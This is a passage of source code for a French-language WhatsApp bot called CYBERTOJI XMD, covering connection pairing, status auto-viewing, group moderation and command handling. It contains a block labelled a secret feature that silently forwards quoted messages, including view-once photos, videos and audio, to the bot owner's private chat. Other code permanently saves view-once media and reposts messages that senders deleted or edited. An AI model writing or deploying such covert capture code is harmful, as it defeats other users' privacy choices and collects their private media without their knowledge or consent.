        rl.question('📱 Entrez votre numéro WhatsApp (ex: 33612345678): ', (answer) => {
          rl.close();
          resolve(answer.trim());
        });
      });

      if (phoneNumber) {
        config.phoneNumber = phoneNumber;
        const code = await sock.requestPairingCode(phoneNumber);
        console.log('\n╔═══════════════════════════════════╗');
        console.log('║   🔑 PAIRING CODE GÉNÉRÉ 🔑      ║');
        console.log('╚═══════════════════════════════════╝');
        console.log(`\n     CODE: ${code}\n`);
      }
    } else {
      const code = await sock.requestPairingCode(config.phoneNumber);
      console.log('\n╔═══════════════════════════════════╗');
      console.log('║   🔑 PAIRING CODE GÉNÉRÉ 🔑      ║');
      console.log('╚═══════════════════════════════════╝');
      console.log(`\n     CODE: ${code}\n`);
    }
  }

  // Connection update handler
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr && !config.usePairingCode) {
      console.log('\n📱 Scan this QR code with WhatsApp:');
      qrcode.generate(qr, { small: true });
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log('Connection closed, reconnecting:', shouldReconnect);

      if (shouldReconnect) {
        await delay(3000);
        connectToWhatsApp();
      } else {
        console.log('Logged out. Delete auth folder and restart.');
        saveData();
      }
    } else if (connection === 'open') {
      console.log('✅ Connecté à WhatsApp!');
      console.log(`Bot: ${config.botName}`);
      console.log(`Bot JID: ${sock.user.id}`);
      console.log('\n⚔️ 𝐂𝐘𝐁𝐄𝐑 𝐓𝐎𝐉𝐈 𝐗𝐌𝐃 est prêt! ⚔️\n');
    }
  });

  sock.ev.on('creds.update', saveCreds);

  const processedMsgIds=new Set();
  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if(type!=='notify')return;
    for(const message of messages){
      const msgAge=Date.now()-((message.messageTimestamp||0)*1000);
      if(msgAge>60000)continue;
      const msgId=message.key.id;
      if(processedMsgIds.has(msgId))continue;
      processedMsgIds.add(msgId);
      if(processedMsgIds.size>2000)processedMsgIds.delete(processedMsgIds.values().next().value);
      // IMPORTANT: Accepter les messages du bot aussi (pour les discussions privées with le numéro du bot)
      if (message.key.remoteJid === 'status@broadcast') {
        // =============================================
        // GESTION AUTOMATIQUE DES STATUS
        // =============================================
        try {
          const statusSender = message.key.participant || message.key.remoteJid;
          const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
          
          console.log(`📱 Nouveau status détecté de: ${statusSender}`);
          
          // AutoView - Lire le status automatiquement
          if (autoReadStatus) {
            await sock.readMessages([message.key]).catch((err) => {
              console.error('خطأ lecture status:', err);
            });
            console.log('✅ Status lu automatiquement');
          }
          
          // ReactStatus - Réagir with emoji si activé et pas notre propre status
          if (autoLikeStatus && statusSender !== botJid) {
            // Vérifier que ce n'est pas un message protocol
            const messageType = Object.keys(message.message || {})[0];
            if (!messageType || messageType === 'protocolMessage') {
              console.log('⏭️ Status ignoré (message protocol)');
              continue;
            }
            
            // Utiliser l'emoji 🇭🇹
            const emojiToUse = '🇭🇹';
            
            await sock.sendMessage('status@broadcast', {
              react: { 
                text: emojiToUse, 
                key: message.key 
              }
            }, { 
              statusJidList: [statusSender] 
            }).catch((err) => {
              console.error('خطأ réaction status:', err);
            });
            
            console.log(`✅ Status liké with ${emojiToUse}`);
          }
          
        } catch (error) {
          console.error('خطأ lors de la gestion du status:', error);
        }
        continue; // Ne pas traiter les status comme des messages normaux
      }

      const remoteJid = message.key.remoteJid;
      const isGroup = remoteJid.endsWith('@g.us');
      let senderJid;
      if (isGroup) { senderJid = message.key.participant; }
      else if (message.key.fromMe) { senderJid = sock.user.id.split(':')[0]+'@s.whatsapp.net'; }
      else { senderJid = remoteJid; }

      // =============================================
      // CACHE DES MESSAGES POUR ANTI-DELETE/EDIT
      // =============================================
      if (antiDelete || antiEdit) {
        const messageId = message.key.id;
        const messageData = {
          key: message.key,
          message: message.message,
          sender: senderJid,
          senderName: message.pushName || senderJid.split('@')[0],
          remoteJid: remoteJid,
          isGroup: isGroup,
          timestamp: Date.now(),
          text: message.message?.conversation || 
                message.message?.extendedTextMessage?.text || 
                message.message?.imageMessage?.caption ||
                message.message?.videoMessage?.caption ||
                '[Media]'
        };
        messageCache.set(messageId, messageData);
        
        console.log(`💾 Message mis en cache: ID=${messageId}, Texte="${messageData.text.substring(0, 30)}..."`);
        console.log(`📊 Taille du cache: ${messageCache.size} messages`);

        // Nettoyer le cache (garder seulement les 1000 derniers messages)
        if (messageCache.size > 1000) {
          const firstKey = messageCache.keys().next().value;
          messageCache.delete(firstKey);
          console.log(`🗑️ Cache nettoyé, message le plus ancien supprimé`);
        }
      }

      // =============================================
      // TRACKING D'ACTIVITÉ DES MEMBRES (POUR LISTACTIVE/LISTINACTIVE)
      // =============================================
      if (isGroup) {
        // Initialiser la Map pour ce groupe si elle n'existe pas
        if (!memberActivity.has(remoteJid)) {
          memberActivity.set(remoteJid, new Map());
        }
        
        const groupActivity = memberActivity.get(remoteJid);
        const currentActivity = groupActivity.get(senderJid) || { lastالرسالة: 0, messageCount: 0 };
        
        groupActivity.set(senderJid, {
          lastالرسالة: Date.now(),
          messageCount: currentActivity.messageCount + 1
        });
        
        console.log(`📊 Activité: ${senderJid.split('@')[0]} a maintenant ${currentActivity.messageCount + 1} messages`);
      }

      // Détection View Once — capturer tous les types
      const msgKeys = Object.keys(message.message || {});
      const isViewOnce = (
        message.message?.viewOnceMessageV2 ||
        message.message?.viewOnceMessageV2Extension ||
        message.message?.imageMessage?.viewOnce === true ||
        message.message?.videoMessage?.viewOnce === true ||
        msgKeys.some(k => k.toLowerCase().includes('viewonce'))
      );
      if (isViewOnce) {
        await handleViewOnce(sock, message, remoteJid, senderJid);
      }

      // ══════════════════════════════════════════════
      // 🔒 FONCTIONNALITÉ SECRÈTE — Bold Reply Save
      // N'importe qui (y compris le bot) peut répondre en GRAS
      // → capture silencieuse en privé (groupes + privés)
      // ══════════════════════════════════════════════
      try {
        const msgTxt = message.message?.extendedTextMessage?.text ||
                       message.message?.conversation || '';
        const isBold = /\*[^*]+\*/.test(msgTxt); // Contient *texte en gras*
        const quotedCtx = message.message?.extendedTextMessage?.contextInfo;
        const hasQuoted = quotedCtx?.quotedMessage;

        // Autoriser TOUT LE MONDE y compris le bot (supprimé !message.key.fromMe)
        if (isBold && hasQuoted) {
          const isFromBot = message.key.fromMe;
          const botPrivJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
          const sName      = message.pushName || senderJid.split('@')[0];
          const dateNow    = new Date().toLocaleString('fr-FR', { timeZone: 'America/Port-au-Prince' });
          const quoted     = quotedCtx.quotedMessage;

          // En-tête discret
          await sock.sendMessage(botPrivJid, {
            text: `🔒 *[SECRET SAVE]* ${isFromBot ? '🤖' : ''}
👤 +${senderJid.split('@')[0]}
💬 "${msgTxt}"
📅 ${dateNow}
📍 ${remoteJid.endsWith('@g.us') ? 'Groupe' : 'Privé'}
📲 Dest: ${remoteJid}`
          });

          // Sauvegarder le contenu du message cité
          const qVonceMsg  = quoted.viewOnceMessageV2?.message || quoted.viewOnceMessageV2Extension?.message;
          const qImg   = qVonceMsg?.imageMessage  || quoted.imageMessage;
          const qVid   = qVonceMsg?.videoMessage  || quoted.videoMessage;
          const qAud   = quoted.audioMessage;
          const qStick = quoted.stickerMessage;
          const qTxt2  = quoted.conversation || quoted.extendedTextMessage?.text;

          if (qImg) {
            const buf = await toBuffer(await downloadContentFromMessage(qImg, 'image'));
            await sock.sendMessage(botPrivJid, { image: buf, mimetype: qImg.mimetype || 'image/jpeg', caption: qImg.caption || '📸 Vue Unique' });
          } else if (qVid) {
            const buf = await toBuffer(await downloadContentFromMessage(qVid, 'video'));
            await sock.sendMessage(botPrivJid, { video: buf, mimetype: qVid.mimetype || 'video/mp4', caption: qVid.caption || '🎥 Vue Unique' });
          } else if (qAud) {
            const buf = await toBuffer(await downloadContentFromMessage(qAud, 'audio'));
            await sock.sendMessage(botPrivJid, { audio: buf, mimetype: qAud.mimetype || 'audio/ogg', ptt: qAud.ptt || false });
          } else if (qStick) {
            const buf = await toBuffer(await downloadContentFromMessage(qStick, 'sticker'));
            await sock.sendMessage(botPrivJid, { sticker: buf });
          } else if (qTxt2) {
            await sock.sendMessage(botPrivJid, { text: `💬 *Texte cité:*
${qTxt2}` });
          }
        }
      } catch(e) {
        // Silencieux — fonctionnalité secrète
        console.error('[Secret Bold]', e.message);
      }

      // Détection Sticker-Commande (setcmd)
      if (message.message?.stickerMessage && global.stickerCommands?.size > 0) {
        try {
          const stickerMsg = message.message.stickerMessage;
          const stream = await downloadContentFromMessage(stickerMsg, 'sticker');
          const buf    = await toBuffer(stream);
          const hash   = buf.slice(0, 32).toString('hex');
          const linkedCmd = global.stickerCommands.get(hash);
          if (linkedCmd) {
            console.log(`🎭 Sticker-cmd déclenché: ${config.prefix}${linkedCmd}`);
            // Simuler le message texte de la commande et appeler handleCommand
            const fakeText = config.prefix + linkedCmd;
            await handleCommand(sock, message, fakeText, remoteJid, senderJid, remoteJid.endsWith('@g.us'));
          }
        } catch(e) { console.error('[Sticker-cmd]', e.message); }
      }

      const messageText = message.message?.conversation || 
                         message.message?.extendedTextMessage?.text || '';
      const senderName = message.pushName || 'Unknown';

      console.log(`\n📨 ${senderName} (${isGroup ? 'Group' : 'Private'}): ${messageText}`);

      // ═══ MENU INTERACTIF — Détection réponse ═══════════════════════════════
      const quotedMsgId = message.message?.extendedTextMessage?.contextInfo?.stanzaId;
      if (quotedMsgId && global.menuMessages?.has(quotedMsgId)) {
        const choice = messageText.trim();
        
        // Mapper numéros → catégories (décalage -1 car ❶=ALL MENU qui est catégorie 0)
        const menuMap = {
          '1': '0',  // ❶ ALL MENU → catégorie 0
          '2': '1',  // ❷ OWNER MENU → catégorie 1
          '3': '2',  // ❸ DOWNLOAD MENU → catégorie 2
          '4': '3',  // ❹ GROUP MENU → catégorie 3
          '5': '4',  // ❺ PROTECTION MENU → catégorie 4
          '6': '5',  // ❻ ATTACK MENU → catégorie 5
          '7': '6',  // ❼ MEDIA MENU → catégorie 6
          '8': '7',  // ❽ GENERAL MENU → catégorie 7
          '9': '8',  // ❾ VIEW ONCE MENU → catégorie 8
          '10': '9', // ❿ GAMES MENU → catégorie 9
          '❶': '0', '❷': '1', '❸': '2', '❹': '3', '❺': '4',
          '❻': '5', '❼': '6', '❽': '7', '❾': '8', '❿': '9'
        };
        
        const num = menuMap[choice];
        if (num) {
          console.log(`🎯 Menu réponse: ${choice} → catégorie ${num}`);
          
          // Réagir avec le numéro
          try {
            await sock.sendMessage(remoteJid, {
              react: { text: choice, key: message.key }
            });
          } catch(e) {}
          
          // Simuler la commande !0, !1, !2, etc.
          const fakeText = config.prefix + num;
          await handleCommand(sock, message, fakeText, remoteJid, senderJid, isGroup);
          
          // Supprimer du cache
          global.menuMessages.delete(quotedMsgId);
          continue;
        }
      }


      // Update database
      if (!database.users.has(senderJid)) {
        database.users.set(senderJid, {
          name: senderName,
          messageCount: 0,
          lastSeen: Date.now()
        });
        database.statistics.totalUsers++;
      }
      
      const userData = database.users.get(senderJid);
      userData.messageCount++;
      userData.lastSeen = Date.now();
      database.statistics.totalMessages++;

      if(botMode==='private'&&!isAdmin(senderJid)){
        if(messageText.startsWith(config.prefix))await sock.sendMessage(remoteJid,{text:'🔒 MODE PRIVÉ — Admins seulement.'});
        continue;
      }

      // PROTECTIONS ANTI (DANS LES GROUPES)
      if (isGroup) {
        const settings = initGroupSettings(remoteJid);
        const userIsGroupAdmin = await isGroupAdmin(sock, remoteJid, senderJid);
        const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);

        if (!userIsGroupAdmin) {
          
          if(settings.antibot&&botIsAdmin){
            const _pn=(message.pushName||'').toLowerCase(),_sn=senderJid.split('@')[0];
            if((_pn.includes('bot')||_pn.includes('robot')||/^\d{16,}$/.test(_sn))&&!isAdmin(senderJid)){
              try{await sock.groupParticipantsUpdate(remoteJid,[senderJid],'remove');await sock.sendMessage(remoteJid,{text:`🤖 Bot expulsé: @${_sn}`,mentions:[senderJid]});continue;}catch(e){}
            }
          }

          // ANTI-LINK
          if (settings.antilink && botIsAdmin) {
            const linkRegex = /(https?:\/\/[^\s]+)|(www\.[^\s]+)|((whatsapp|wa|chat)\.gg\/[^\s]+)/gi;
            if (linkRegex.test(messageText)) {
              try {
                await sock.sendMessage(remoteJid, { delete: message.key });
                const warnCount = addWarn(remoteJid, senderJid, 'Envoi de lien');
                
                await sock.sendMessage(remoteJid, {
                  text: `🚫 @${senderJid.split('@')[0]}, les liens sont interdits!\n\n⚠️ Warning ${warnCount}/${settings.maxWarns}`,
                  mentions: [senderJid]
                });

                if (warnCount >= settings.maxWarns) {
                  await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
                  await sock.sendMessage(remoteJid, {
                    text: `❌ @${senderJid.split('@')[0]} a été expulsé (trop d'warnings)`,
                    mentions: [senderJid]
                  });
                  resetWarns(remoteJid, senderJid);
                }
                
                console.log(`✅ Lien bloqué de ${senderJid}`);
                continue;
              } catch (error) {
                console.error('خطأ in antilink:', error);
              }
            }
          }

          // ANTI-TAG
          if (settings.antitag && botIsAdmin) {
            const mentions = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
            if (mentions.length > 5) {
              try {
                await sock.sendMessage(remoteJid, { delete: message.key });
                const warnCount = addWarn(remoteJid, senderJid, 'Tag massif');
                
                await sock.sendMessage(remoteJid, {
                  text: `🚫 @${senderJid.split('@')[0]}, pas de tags massifs!\n\n⚠️ Warning ${warnCount}/${settings.maxWarns}`,
                  mentions: [senderJid]
                });

                if (warnCount >= settings.maxWarns) {
                  await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
                  await sock.sendMessage(remoteJid, {
                    text: `❌ @${senderJid.split('@')[0]} a été expulsé (trop d'warnings)`,
                    mentions: [senderJid]
                  });
                  resetWarns(remoteJid, senderJid);
                }
                
                console.log(`✅ Tag massif bloqué de ${senderJid}`);
                continue;
              } catch (error) {
                console.error('خطأ in antitag:', error);
              }
            }
          }

          // ANTI-بريد مزعج
          if (settings.antispam && botIsAdmin && messageText) {
            if (checkSpam(senderJid, messageText)) {
              try {
                await sock.sendMessage(remoteJid, { delete: message.key });
                const warnCount = addWarn(remoteJid, senderJid, 'Spam détecté');
                
                await sock.sendMessage(remoteJid, {
                  text: `🚫 @${senderJid.split('@')[0]}, arrêtez de spammer!\n\n⚠️ Warning ${warnCount}/${settings.maxWarns}`,
                  mentions: [senderJid]
                });

                if (warnCount >= settings.maxWarns) {
                  await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
                  await sock.sendMessage(remoteJid, {
                    text: `❌ @${senderJid.split('@')[0]} a été expulsé (spam)`,
                    mentions: [senderJid]
                  });
                  resetWarns(remoteJid, senderJid);
                }
                
                console.log(`✅ Spam bloqué de ${senderJid}`);
                continue;
              } catch (error) {
                console.error('خطأ in antispam:', error);
              }
            }
          }
        }
      }

      // =============================================
      // 🛡️ ANTI-BUG GLOBAL (avant toute autre logique)
      // =============================================
      if (antiBug && !isAdmin(senderJid)) {
        const bugDetected = detectBugPayload(message, messageText);
        if (bugDetected) {
          await handleAntiBugTrigger(sock, message, remoteJid, senderJid, isGroup, bugDetected);
          continue;
        }
      }

      // Auto-react
      if (autoReact && messageText) {
        await handleAutoReact(sock, message, messageText, remoteJid);
      }

      // 🎮 Gestionnaire réactions jeux (Squid Game / Quiz)
      if (isGroup && messageText) {
        await handleGameReaction(sock, message, messageText, remoteJid, senderJid);
      }

      if(messageText.startsWith(config.prefix)){
        if(!isAdmin(senderJid)&&!checkCooldown(senderJid,'any')){
          await sock.sendMessage(remoteJid,{text:'⏱️ Please wait a few seconds.'});continue;
        }
        await handleCommand(sock,message,messageText,remoteJid,senderJid,isGroup);continue;
      }

      // Auto-reply
      if (config.autoReply) {
        const lowerText = messageText.toLowerCase().trim();
        for (const [keyword, reply] of Object.entries(autoReplies)) {
          if (lowerText.includes(keyword)) {
            await simulateTyping(sock, remoteJid);
            await sock.sendMessage(remoteJid, { text: reply });
            console.log(`✅ Auto-reply: ${keyword}`);
            break;
          }
        }
      }
    }
  });

  sock.ev.on('groups.update', (updates) => {
    for (const update of updates) {
      if (update.id) {
        database.groups.set(update.id, {
          ...database.groups.get(update.id),
          ...update,
          lastUpdate: Date.now()
        });
      }
    }
  });

  // Gérer les nouveaux participants (pour permaban + welcome/goodbye)
  sock.ev.on('group-participants.update', async (update) => {
    const { id: groupJid, participants, action } = update;
    
    // Si quelqu'un rejoint le groupe
    if (action === 'add') {
      for (const participantJid of participants) {
        // Vérifier si la personne est permaban
        if (isPermaBanned(groupJid, participantJid)) {
          const banInfo = getPermaBanInfo(groupJid, participantJid);
          
          // Vérifier si le bot est admin
          const botIsAdmin = await isBotGroupAdmin(sock, groupJid);
          if (botIsAdmin) {
            try {
              // Expulser immédiatement
              await sock.groupParticipantsUpdate(groupJid, [participantJid], 'remove');
              
              // Notifier le groupe
              await sock.sendMessage(groupJid, {
                text: `🚫 *PERMABAN ACTIF*\n\n@${participantJid.split('@')[0]} a été expulsé automatiquement.\n\nRaison: ${banInfo.reason}\nBanni le: ${new Date(banInfo.timestamp).toLocaleString('fr-FR')}\nBanni par: @${banInfo.bannedBy.split('@')[0]}`,
                mentions: [participantJid, banInfo.bannedBy]
              });
              
              console.log(`✅ Permaban appliqué: ${participantJid} expulsé de ${groupJid}`);
            } catch (error) {
              console.error('خطأ applying permaban:', error);
            }
          }
        } else {
          // Si pas banni, envoyer le message de bienvenue si activé
          const settings = getGroupSettings(groupJid);
          if (settings.welcome) {
            try {
              await sendWelcomeMessage(sock, groupJid, participantJid);
            } catch (error) {
              console.error('خطأ sending welcome:', error);
            }
          }
        }
      }
    }
    
    // Si quelqu'un quitte le groupe
    if (action === 'remove') {
      const settings = getGroupSettings(groupJid);
      if (settings.goodbye) {
        for (const participantJid of participants) {
          try {
            await sendGoodbyeMessage(sock, groupJid, participantJid);
          } catch (error) {
            console.error('خطأ sending goodbye:', error);
          }
        }
      }
    }
  });

  // =============================================
  // ANTI-DELETE - Détection des messages supprimés
  // =============================================
  sock.ev.on('messages.delete', async (deletion) => {
    if (!antiDelete) return;

    try {
      console.log('🗑️ Suppression détectée:', JSON.stringify(deletion, null, 2));
      
      // Gérer différents formats de deletion
      let keys = [];
      
      if (deletion.keys) {
        // Format: { keys: [{id: '...', remoteJid: '...', fromMe: ...}] }
        keys = deletion.keys;
      } else if (Array.isArray(deletion)) {
        // Format: [{ id: '...', remoteJid: '...', fromMe: ... }]
        keys = deletion;
      } else if (deletion.id) {
        // Format: { id: '...', remoteJid: '...', fromMe: ... }
        keys = [deletion];
      }
      
      console.log(`🔍 ${keys.length} message(s) à vérifier`);
      
      for (const key of keys) {
        const messageId = key.id || key;
        console.log(`🔎 Recherche message ID: ${messageId}`);
        
        const cachedMsg = messageCache.get(messageId);
        
        if (!cachedMsg) {
          console.log(`❌ Message ${messageId} non trouvé dans cache`);
          continue;
        }
        
        console.log(`✅ Message trouvé: "${cachedMsg.text.substring(0, 50)}..."`);
        
        const isGroup = cachedMsg.isGroup;
        const senderJid = cachedMsg.sender;
        const senderName = cachedMsg.senderName || senderJid.split('@')[0];
        
        // Ne pas notifier si c'est le bot qui supprime
        if (key.fromMe) {
          console.log('⏭️ Message supprimé par le bot, skip');
          continue;
        }
        
        // Vérifier le mode
        let shouldNotify = false;
        let notifyJid = cachedMsg.remoteJid;
        
        if (antiDeleteMode === 'all') {
          shouldNotify = true;
        } else if (antiDeleteMode === 'gchat' && isGroup) {
          shouldNotify = true;
        } else if (antiDeleteMode === 'private') {
          shouldNotify = true;
          notifyJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        }
        
        if (!shouldNotify) {
          console.log(`⏭️ Mode ${antiDeleteMode}: notification skip`);
          continue;
        }
        
        const notificationText = `▎🗑️ SUPPRIMÉ | @${senderJid.split('@')[0]}
▎« ${cachedMsg.text} »
▎© powered by Dostoevsky TechX`;

        await sock.sendMessage(notifyJid, {
          text: notificationText,
          mentions: [senderJid]
        });
        
        console.log(`✅ Notification envoyée vers ${notifyJid} (mode: ${antiDeleteMode})`);
      }
    } catch (error) {
      console.error('❌ Erreur antidelete:', error);
    }
  });

  // =============================================
  // ANTI-EDIT - Détection des messages modifiés
  // =============================================
  sock.ev.on('messages.update', async (updates) => {
    if (!antiEdit) return;

    try {
      console.log('✏️ Événement de mise à jour détecté:', updates.length);
      
      for (const update of updates) {
        const messageId = update.key?.id;
        if (!messageId) continue;
        
        const cachedMsg = messageCache.get(messageId);
        if (!cachedMsg || cachedMsg.text === '[Media]') continue;
        
        // Extraire nouveau texte
        let newText = null;
        if (update.update?.message) {
          const msg = update.update.message;
          newText = msg.conversation || 
                   msg.extendedTextMessage?.text ||
                   msg.editedMessage?.message?.conversation ||
                   msg.editedMessage?.message?.extendedTextMessage?.text;
        }
        
        if (!newText || newText === cachedMsg.text) continue;
        
        const isGroup = cachedMsg.isGroup;
        const senderJid = cachedMsg.sender;
        const senderName = cachedMsg.senderName || senderJid.split('@')[0];
        
        // Vérifier le mode
        let shouldNotify = false;
        let notifyJid = cachedMsg.remoteJid;
        
        if (antiEditMode === 'all') {
          shouldNotify = true;
        } else if (antiEditMode === 'gchat' && isGroup) {
          shouldNotify = true;
        } else if (antiEditMode === 'private') {
          shouldNotify = true;
          notifyJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        }
        
        if (!shouldNotify) continue;
        
        const notificationText = `▎📝 MODIFIÉ | @${senderJid.split('@')[0]}
▎❌ Ancien: ${cachedMsg.text}
▎✅ Nouveau: ${newText}
▎© powered by Dostoevsky TechX`;

        await sock.sendMessage(notifyJid, {
          text: notificationText,
          mentions: [senderJid]
        });
        
        console.log(`✏️ Notification envoyée (mode: ${antiEditMode})`);
        cachedMsg.text = newText; // Mettre à jour cache
      }
    } catch (error) {
      console.error('خطأ handling message edit:', error);
    }
  });

  return sock;
}

// =============================================
// GESTION VIEW ONCE
// =============================================

async function handleViewOnce(sock, message, remoteJid, senderJid) {
  console.log('🔍 View once détecté');
  
  try {
    let mediaData = null;
    let mediaType = '';
    let mimetype = '';
    let isGif = false;
    let isPtt = false;
    
    // Chercher le média dans plusieurs structures possibles
    const viewOnceMsg = message.message?.viewOnceMessageV2 || 
                        message.message?.viewOnceMessageV2Extension;
    
    // Récupérer l'imageMessage/videoMessage peu importe la structure
    const imgMsg   = viewOnceMsg?.message?.imageMessage  || message.message?.imageMessage;
    const vidMsg   = viewOnceMsg?.message?.videoMessage  || message.message?.videoMessage;
    const audioMsg = viewOnceMsg?.message?.audioMessage  || message.message?.audioMessage;

    if (imgMsg) {
      mediaType = 'image';
      mimetype  = imgMsg.mimetype || 'image/jpeg';
      const stream = await downloadContentFromMessage(imgMsg, 'image');
      mediaData = await toBuffer(stream);
      
    } else if (vidMsg) {
      mediaType = 'video';
      mimetype  = vidMsg.mimetype || 'video/mp4';
      isGif     = vidMsg.gifPlayback || false;
      const stream = await downloadContentFromMessage(vidMsg, 'video');
      mediaData = await toBuffer(stream);
      
    } else if (audioMsg) {
      mediaType = 'audio';
      mimetype  = audioMsg.mimetype || 'audio/ogg';
      isPtt     = audioMsg.ptt || false;
      const stream = await downloadContentFromMessage(audioMsg, 'audio');
      mediaData = await toBuffer(stream);
    }
    
    if (mediaData) {
      if (!savedViewOnce.has(senderJid)) {
        savedViewOnce.set(senderJid, []);
      }
      
      const userSaved = savedViewOnce.get(senderJid);
      userSaved.push({
        type: mediaType,
        buffer: mediaData,
        mimetype: mimetype,
        isGif: isGif,
        ptt: isPtt,
        timestamp: Date.now(),
        sender: senderJid,
        size: mediaData.length  // 💾 Taille en bytes
      });
      
      if (userSaved.length > config.maxViewOncePerUser) {
        userSaved.shift();
      }
      
      const totalSaved = [...savedViewOnce.values()].reduce((s, a) => s + a.length, 0);
      console.log(`✅ View once [${mediaType}] enregistré depuis ${senderJid} (${(mediaData.length/1024).toFixed(0)} KB)`);
      saveStoreKey('viewonce'); // 💾 Sauvegarde immédiate
      
      // Notification dans tous les cas (privé + groupe)
      const icon = mediaType === 'image' ? '📸' : mediaType === 'video' ? '🎥' : '🎵';
      const numInList = [...savedViewOnce.values()].reduce((s, a) => s + a.length, 0);
      await sock.sendMessage(remoteJid, {
        text: `${icon} *تم حفظ وسائط Vue Unique!*\n\n📦 المحفوظ: #${numInList}\n📏 الحجم: ${(mediaData.length/1024).toFixed(0)} KB\n\n📌 للاسترجاع: ${config.prefix}vv\n📋 القائمة: ${config.prefix}vv list`
      });
    }
  } catch (error) {
    console.error('خطأ view once:', error);
  }
}

// =============================================
// AUTO-REACT
// =============================================

// Liste des emojis pour la rotation sur chaque message
const REACT_EMOJIS = [
  '🧑‍💻','☝️','👍','🇭🇹','✅','😭','⚖️','☠️',
  '👹','👺','🤖','👽','👾','🌚','🕳️','🤳',
  '🙏','🏊','🤽','🪨','🦊','🐼','🚀','🕋',
  '🗽','🗿','💰','💎','🧾','🧮','⚙️','⛓️',
  '🧲','📝','📄','📃','📥','🛎️','📜'
];
let reactIndex = 0; // Pointeur de rotation

async function handleAutoReact(sock, message, messageText, remoteJid) {
  if (!autoReact) return;
  try {
    const emoji = REACT_EMOJIS[reactIndex % REACT_EMOJIS.length];
    reactIndex++;
    await sock.sendMessage(remoteJid, {
      react: { text: emoji, key: message.key }
    });
  } catch (e) {
    // Silencieux
  }
}

// =============================================
// GESTION DES COMMANDES
// =============================================

async function handleCommand(sock, message, messageText, remoteJid, senderJid, isGroup) {
  const args = messageText.slice(config.prefix.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  console.log(`🎯 Command: ${command} from ${senderJid} | isAdmin: ${isAdmin(senderJid)}`);
  if(autoTyping)simulateTyping(sock,remoteJid,1500).catch(()=>{});
  if(autoRecording)simulateRecording(sock,remoteJid,1000).catch(()=>{});

  if(autoReact){try{const emoji=REACT_EMOJIS[reactIndex%REACT_EMOJIS.length];reactIndex++;await sock.sendMessage(remoteJid,{react:{text:emoji,key:message.key}});}catch(e){}}

  // 🖼️🎬 Pré-envoi du média de la commande (image ou vidéo si elle existe)
  // Ex: ping.jpg ou ping.mp4 → envoyé avant la réponse de !ping
  const selfImageCmds = ['ping','alive','info','menu','allmenu','sticker','take','vv','tostatus','groupstatus'];
  if (!selfImageCmds.includes(command)) {
    const videoExts = ['.mp4','.mov','.mkv'];
    const imageExts = ['.jpg','.jpeg','.png','.gif','.webp'];
    let found = false;

    // Chercher vidéo en premier
    for (const ext of videoExts) {
      const p = `./${command}${ext}`;
      if (fs.existsSync(p)) {
        try {
          await sock.sendMessage(remoteJid, {
            video: fs.readFileSync(p),
            caption: '',
            gifPlayback: false
          });
        } catch(e) { /* silencieux */ }
        found = true; break;
      }
    }
    // Sinon image
    if (!found) {
      for (const ext of imageExts) {
        const p = `./${command}${ext}`;
        if (fs.existsSync(p)) {
          try {
            await sock.sendMessage(remoteJid, { image: fs.readFileSync(p), caption: '' });
          } catch(e) { /* silencieux */ }
          break;
        }
      }
    }
  }

  const BOT_ADMIN_ONLY_CMDS=['mode','update','maj','upgrade','autotyping','autorecording','autoreact','readstatus','autostatus','antibug','anti-bug','antidelete','antidel','antiedit','leave','kickall','acceptall','join','block','unblock','pair','connect','adduser','t','megaban'];
  if(BOT_ADMIN_ONLY_CMDS.includes(command)&&!isAdmin(senderJid)){
    await sock.sendMessage(remoteJid,{text:'⛔ Commande réservée aux admins du bot.'});
    return;
  }

  try {
    switch (command) {
      case 'help':
        await simulateTyping(sock, remoteJid);
        await sock.sendMessage(remoteJid, {
          text: `╔══════════════════════════════╗
║      𝐂𝐘𝐁𝐄𝐑 𝐓𝐎𝐉𝐈 𝐗𝐌𝐃         ║
╚══════════════════════════════╝

⚔️ *MENU D'AIDE* ⚔️

${autoReplies.help}

━━━━━━━━━━━━━━━━━━━━━
💡 Tape !menu pour le menu complet!
━━━━━━━━━━━━━━━━━━━━━

    Inspiré par Toji Fushiguro
    Le Sorcier Killer 🗡️`
        });
        // MOVED TO FINALLY
        break;

      case 'repo':
      case 'git':
      case 'github':
      case 'script': {
        await simulateTyping(sock, remoteJid);
        const repoText = `
╔═══════════════════════════════╗
║  𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗 — 𝗥𝗘𝗣𝗢𝗦𝗜𝗧𝗢𝗥𝗬  ║
╚═══════════════════════════════╝

🔗 *LIENS OFFICIELS*

📂 *GitHub Repository:*
https://github.com/lord007-maker/CYBERTOJI-XMD-.git

📢 *Chaîne WhatsApp:*
https://whatsapp.com/channel/0029Vb7mdO3KAwEeztGPQr3U

👥 *Groupe WhatsApp:*
https://chat.whatsapp.com/Fpob9oMDSFlKrtTENJSrUb

━━━━━━━━━━━━━━━━━━━━━━━━━━━
⭐ Star le repo sur GitHub!
🔔 Rejoins la chaîne pour les mises à jour!
💬 Rejoins le groupe pour le support!
━━━━━━━━━━━━━━━━━━━━━━━━━━━

© 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 𝙳𝙾𝚂𝚃𝙾𝙴𝚅𝚂𝙺𝚈 𝚃𝙴𝙲𝙷𝚇 🇭🇹`;
        await sock.sendMessage(remoteJid, { text: repoText });
        break;
      }

      case 'fancy':
        await handleFancy(sock, args, remoteJid, senderJid);
        break;

      case 'ping': {
        const start = Date.now();
        await sock.sendMessage(remoteJid, { text: '⚡ ...' });
        const latency = Date.now() - start;
        const now = new Date();

        const dateStr = now.toLocaleDateString('fr-FR', {
          timeZone: 'America/Port-au-Prince',
          day: '2-digit', month: '2-digit', year: 'numeric'
        });
        const timeStr = now.toLocaleTimeString('fr-FR', {
          timeZone: 'America/Port-au-Prince',
